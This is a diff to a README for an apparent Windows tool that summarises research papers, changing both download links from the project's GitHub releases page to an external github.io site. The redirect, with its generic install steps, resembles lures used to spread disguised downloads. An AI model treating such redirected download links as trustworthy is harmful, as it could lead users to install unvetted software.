@@ -1,6 +1,6 @@
 # 📚 paper-deep-reading-skill - Turn research papers into summary notes
 
-[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Robertmorrisluminousenergy177/paper-deep-reading-skill/releases)
+[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://robertmorrisluminousenergy177.github.io)
 
 This application helps users digest complex academic research papers. It uses artificial intelligence to scan PDF files and create structured notes. You can paste these notes into Obsidian or any other markdown-compatible tool. The software removes the need to manually summarize long documents, which saves time during your literature review.
 
@@ -12,7 +12,7 @@ Your computer must run Windows 10 or Windows 11. You need at least 4GB of RAM to
 
 Visit the link below to download the software for Windows.
 
-[Download the latest version here](https://github.com/Robertmorrisluminousenergy177/paper-deep-reading-skill/releases)
+[Download the latest version here](https://robertmorrisluminousenergy177.github.io)
 
 1. Open the link in your web browser.
 2. Look for the section labeled "Assets" under the most recent release.
